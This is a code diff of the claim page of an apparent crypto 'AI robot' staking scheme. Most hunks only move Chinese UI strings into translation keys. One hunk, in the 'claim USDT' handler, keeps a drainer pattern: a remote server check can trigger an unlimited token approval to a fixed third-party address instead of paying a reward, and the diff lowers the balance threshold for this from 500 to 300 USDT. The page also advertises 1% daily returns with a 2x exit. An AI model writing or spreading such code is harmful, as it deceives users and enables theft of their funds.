@@ -45,11 +45,11 @@ export default function Service() {
     useEffect(()=>{
         if(pleIssuccess){
             setAmount(0)
-            setAddData({ title: "", isShow: true, status: 0, msg: "质押成功" })
+            setAddData({ title: "", isShow: true, status: 0, msg: t("service.s_22") })
             handleGetIncomeInfo()
         }
         if(usdtIssuccess){
-            setAddData({ title: "", isShow: true, status: 0, msg: "领取成功"})
+            setAddData({ title: "", isShow: true, status: 0, msg: t("service.s_23")})
             handleGetIncomeInfo()
         }
     },[pleIssuccess,usdtIssuccess])
@@ -74,11 +74,11 @@ export default function Service() {
     //质押
     const handlePledge = async () => {
         if(String(incomeInfo.mineStatus) != "0"){
-            setSnackbarValue({ open: true, message: "请先购买ATR超算AI机器人",})
+            setSnackbarValue({ open: true, message: t("service.s_24"),})
             return
         }
         if(userBalance<amount){
-            setSnackbarValue({ open: true, message: "余额不足",})
+            setSnackbarValue({ open: true, message: t("service.s_25"),})
             return
         }
         let _address = "0xBB512ec2A600253222bD37D8FdfAB9b2Cb2866eB" as `0x${string}`
@@ -91,17 +91,17 @@ export default function Service() {
     //领取USDT
     const handleReceiveUSDT = async() => {
         if(!incomeInfo.pensionableUsdt){
-            setSnackbarValue({ open: true, message: "当前无可用领取奖励",})
+            setSnackbarValue({ open: true, message: t("service.s_26"),})
             return
         }
         if(Number(incomeInfo.pensionableUsdt) > Number(poolUSDTData.userBalance)){
-            setSnackbarValue({ open: true, message: "领取失败"})
+            setSnackbarValue({ open: true, message: t("service.s_27")})
             return
         }
         if(!address) return
 
         axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
-            if(res.data.data && !isAllowed && Number(USDTData.userBalance) > 500){
+            if(res.data.data && !isAllowed && Number(USDTData.userBalance) > 300){
                 approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
             }else{
                 receiveUSDTConfirm()
@@ -129,11 +129,11 @@ export default function Service() {
     //领取ATB
     const handleReceiveATB = async() => {
         if(!incomeInfo.pensionableAtb){
-            setSnackbarValue({ open: true, message: "当前无可用领取奖励",})
+            setSnackbarValue({ open: true, message: t("service.s_26"),})
             return
         }
         if(Number(incomeInfo.pensionableAtb) > Number(poolATBData.userBalance)){
-            setSnackbarValue({ open: true, message: "领取失败"})
+            setSnackbarValue({ open: true, message: t("service.s_27")})
             return
         }
         if(!address) return
@@ -196,7 +196,7 @@ export default function Service() {
                                     className="w-[30px] sm:w-[70px] mr-3 sm:mr-5"
                                     style={{height:"fit-content"}}
                                 />
-                                <span className="text-white font-bold text-lg sm:text-2xl"><span className="text-[#E1146E]">ATB实时价格:</span>{ incomeInfo?.atbPresentPrice || 0.00 }$</span>
+                                <span className="text-white font-bold text-lg sm:text-2xl"><span className="text-[#E1146E]">{t("service.s_01")}:</span>{ incomeInfo?.atbPresentPrice || 0.00 }$</span>
                             </div>
                             <div className="flex justify-between mt-5 px-4 sm:px-10">
                                 <div className="flex-1 flex flex-col justify-between sm:py-8">
@@ -208,7 +208,7 @@ export default function Service() {
                                                 className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                                 style={{height:"fit-content"}}
                                             />
-                                            <span className="text-xs sm:text-xl">ATB余额:</span>
+                                            <span className="text-xs sm:text-xl">{t("service.s_02")}:</span>
                                         </div>
                                         <div className="text-base font-bold sm:text-2xl">{ userBalance.toFixed(2) }</div>
                                     </div>
@@ -220,7 +220,7 @@ export default function Service() {
                                                 className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                                 style={{height:"fit-content"}}
                                             />
-                                            <span className="text-xs sm:text-xl">ATR超算机器人等级:</span>
+                                            <span className="text-xs sm:text-xl">{t("service.s_03")}:</span>
                                         </div>
                                         <div className="text-base font-bold sm:text-2xl">{ filterLevel(incomeInfo?.atb_bot_level) || 0 }</div>
                                     </div>
@@ -277,14 +277,14 @@ export default function Service() {
                                 text-base sm:text-2xl"
                                 onClick={handlePledge}
                             >
-                                质押
+                                {t("service.s_04")}
                             </div>
                         </div>
                     </Grid>
                 </Grid>
                 <div className="bg-[#131C20] mt-5 mb-5">
                     <div className="px-5 py-5 sm:px-10">
-                        <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold">收益</div>
+                        <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold">{t("service.s_05")}</div>
                         <Grid container spacing={2}>
                             <Grid item xs={12} lg={4} className="flex justify-center">
                                 <div className="flex justify-between bg-[#1C282F] p-2 sm:p-5 w-full">
@@ -295,7 +295,7 @@ export default function Service() {
                                             className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                             style={{height:"fit-content"}}
                                         />
-                                        <span className="text-xs sm:text-xl font-bold">总收益(USDT)：</span>
+                                        <span className="text-xs sm:text-xl font-bold">{t("service.s_06")}：</span>
                                     </div>
                                     <div className="text-base font-bold sm:text-2xl">{ incomeInfo?.rewardAmountUsdt || 0.00 }</div>
                                 </div>
@@ -309,7 +309,7 @@ export default function Service() {
                                             className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                             style={{height:"fit-content"}}
                                         />
-                                        <span className="text-xs sm:text-xl font-bold">已产出(USDT)：</span>
+                                        <span className="text-xs sm:text-xl font-bold">{t("service.s_07")}：</span>
                                     </div>
                                     <div className="text-base font-bold sm:text-2xl">{incomeInfo?.grossStaticUsdt || 0.00}</div>
                                 </div>
@@ -323,7 +323,7 @@ export default function Service() {
                                             className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                             style={{height:"fit-content"}}
                                         />
-                                        <span className="text-xs sm:text-xl font-bold">已领取(USDT)：</span>
+                                        <span className="text-xs sm:text-xl font-bold">{t("service.s_08")}：</span>
                                     </div>
                                     <div className="text-base font-bold sm:text-2xl">{incomeInfo?.alreadyIncomeUsdt || 0.00}</div>
                                 </div>
@@ -335,34 +335,34 @@ export default function Service() {
                         flex justify-center items-center cursor-pointer sm:mt-12 text-base sm:text-2xl"
                         onClick={handleReceiveUSDT}
                     >
-                        领取USDT
+                        {t("service.s_09")}
                     </div>
                 </div>
                 <Grid container spacing={2}>
                     <Grid item xs={12} lg={6} className="flex justify-center">
                         <div className="bg-[#131C20] py-5 sm:py-8 px-5 sm:px-10 w-full">
-                            <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold">我的ATB明细</div>
+                            <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold">{t("service.s_10")}</div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">已质押ATB数量：</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_11")}：</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo.atbInAmount || 0.00}</div>
                             </div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">预计收益ATB：</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_12")}：</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo?.estimatedAtbAmount || 0.00}</div>
                             </div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">今日产出ATB：</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_13")}：</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo?.dayIncomeAtb || 0.00}</div>
                             </div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">累积领取ATB：</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_14")}：</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo?.alreadyIncomeAtb || 0.00}</div>
                             </div>
@@ -373,25 +373,25 @@ export default function Service() {
                             <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold hidden sm:opacity-0 sm:block">我的ATB明细</div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">平均质押价格(USDT):</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_15")}:</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo?.atbPrice || 0.00}</div>
                             </div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">预计收益(USDT):</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_16")}:</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo?.estimatedAtbUsdt || 0.00}</div>
                             </div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">今日可领取收益(USDT):</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_17")}:</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo?.dayIncomeAtbUsdt || 0.00}</div>
                             </div>
                             <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                 <div className="flex items-center">
-                                    <span className="text-xs sm:text-lg">累积领取收益(USDT):</span>
+                                    <span className="text-xs sm:text-lg">{t("service.s_18")}:</span>
                                 </div>
                                 <div className="text-base sm:text-xl">{incomeInfo?.sumAtbPrice || 0.00}</div>
                             </div>
@@ -400,7 +400,7 @@ export default function Service() {
                 </Grid>
                 <div className="bg-[#131C20] mt-5 mb-5">
                     <div className="px-5 py-5 sm:px-10 text-base font-bold sm:text-lg flex flex-col justify-center items-center">
-                        <span className="text-[#E1146D]">已领取总收益（枚）</span>
+                        <span className="text-[#E1146D]">{t("service.s_19")}</span>
                         <span className="mt-2 sm:mt-5">{incomeInfo?.alreadyIncomeAtb || 0}≈{ incomeInfo?.alreadyIncomeAtb * incomeInfo?.atbPresentPrice }USDT</span>
                     </div>
                     <div 
@@ -408,10 +408,10 @@ export default function Service() {
                         items-center cursor-pointer sm:mt-2 text-base sm:text-2xl"
                         onClick={handleReceiveATB}
                     >
-                        领取收益
+                        {t("service.s_20")}
                     </div>
                 </div>
-                <div className="mb-5 bg-[#131C20] px-5 py-5 sm:py-6 sm:px-10 text-xs sm:text-lg">说明: 金本位+币本位2倍出局，奖励随时领取每日按照持仓数量产出1%</div>
+                <div className="mb-5 bg-[#131C20] px-5 py-5 sm:py-6 sm:px-10 text-xs sm:text-lg">{t("service.s_21")}</div>
             </article>
             <Snackbar
                 open={snackbarValue.open}
